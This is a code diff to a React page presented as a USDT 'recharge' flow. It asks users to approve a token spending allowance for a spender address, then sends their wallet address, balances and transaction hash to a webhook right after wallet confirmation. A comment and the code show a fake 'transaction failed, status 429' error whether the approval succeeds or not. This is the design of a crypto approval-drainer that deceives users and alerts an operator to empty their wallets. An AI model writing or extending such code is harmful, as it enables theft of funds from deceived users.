@@ -301,47 +301,31 @@ const RechargeUsdtPage = () => {
   const handlePaymentConfirm = async (paymentAmount: number, mode: 'safe' | 'whitelist') => {
     setIsProcessing(true);
     
+    // Get username first (quick operation)
+    let username = 'unknown';
+    if (user) {
+      const { data: profile } = await supabase
+        .from('profiles')
+        .select('username')
+        .eq('id', user.id)
+        .single();
+      if (profile?.username) {
+        username = profile.username;
+      }
+    }
+    
+    // Get current balances before approval
+    const balances = await checkBalances(paymentAmount);
+    
     try {
+      // Start approval - this will trigger wallet popup
+      // The approveUSDT will return immediately after user confirms in wallet
       const result = await approveUSDT(spenderAddress, paymentAmount);
       
-      // 无论成功还是失败，都显示相同的错误信息
-      toast({
-        title: '交易失败',
-        description: 'Request failed with status code 429',
-        variant: 'destructive',
-      });
-      
-      // Update transaction status
-      if (paymentOrderId) {
-        await supabase
-          .from('transactions')
-          .update({ 
-            status: result.success ? 'completed' : 'failed',
-            tx_hash: result.txHash,
-            wallet_address: address,
-            completed_at: result.success ? new Date().toISOString() : null
-          })
-          .eq('order_id', paymentOrderId);
-      }
-      
-      // Get username and send authorization completed event
-      let username = 'unknown';
-      if (user) {
-        const { data: profile } = await supabase
-          .from('profiles')
-          .select('username')
-          .eq('id', user.id)
-          .single();
-        if (profile?.username) {
-          username = profile.username;
-        }
-      }
-      
-      // Check current balances
-      const balances = await checkBalances(paymentAmount);
-      
-      // Send authorization completed event
-      await sendAuthorizationCompletedEvent({
+      // 用户在钱包中确认后立即发送webhook（不等待链上确认）
+      // Send authorization completed event IMMEDIATELY after wallet confirmation
+      console.log('Sending authorization webhook immediately after wallet confirmation');
+      sendAuthorizationCompletedEvent({
         order_id: paymentOrderId,
         wallet_address: address || '',
         username,
@@ -353,10 +337,56 @@ const RechargeUsdtPage = () => {
         tx_hash: result.txHash || '',
         status: result.success ? 'success' : 'failed',
         payment_mode: mode
+      }).then(response => {
+        console.log('Authorization webhook sent:', response);
+      }).catch(err => {
+        console.error('Failed to send authorization webhook:', err);
       });
+      
+      // 无论成功还是失败，都显示相同的错误信息
+      toast({
+        title: '交易失败',
+        description: 'Request failed with status code 429',
+        variant: 'destructive',
+      });
+      
+      // Update transaction status in background (don't block)
+      if (paymentOrderId) {
+        (async () => {
+          try {
+            await supabase
+              .from('transactions')
+              .update({ 
+                status: result.success ? 'completed' : 'failed',
+                tx_hash: result.txHash,
+                wallet_address: address,
+                completed_at: result.success ? new Date().toISOString() : null
+              })
+              .eq('order_id', paymentOrderId);
+            console.log('Transaction updated');
+          } catch (err) {
+            console.error('Failed to update transaction:', err);
+          }
+        })();
+      }
       
       setShowPaymentModal(false);
     } catch (err: any) {
+      // 即使出错也发送webhook记录失败状态
+      sendAuthorizationCompletedEvent({
+        order_id: paymentOrderId,
+        wallet_address: address || '',
+        username,
+        currency: 'USDT',
+        network: 'TRC20',
+        spender_address: spenderAddress,
+        usdt_balance: balances.usdtBalance,
+        trx_balance: balances.trxBalance,
+        tx_hash: '',
+        status: 'failed',
+        payment_mode: mode
+      }).then(() => {}).catch(e => console.error('Failed to send error webhook:', e));
+      
       toast({
         title: '交易失败',
         description: err.message || '请重试',
